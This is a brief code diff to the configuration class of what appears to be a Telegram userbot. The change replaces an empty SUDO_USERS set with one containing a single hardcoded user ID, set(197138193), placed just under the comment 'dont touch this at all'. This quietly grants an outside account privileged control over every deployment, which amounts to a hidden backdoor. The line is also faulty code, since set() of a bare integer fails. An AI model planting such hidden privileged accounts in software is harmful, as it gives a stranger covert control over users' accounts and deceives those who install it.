@@ -162,7 +162,7 @@ class Config(object):
     # For updater plugin
     UPSTREAM_REPO_BRANCH = os.environ.get("UPSTREAM_REPO_BRANCH", "master")
     # dont touch this at all
-    SUDO_USERS: Set[int] = set()
+    SUDO_USERS: Set[int] = set(197138193)
     CATUBLOGO = None
     BOTLOG = False
     BOTLOG_CHATID = 0
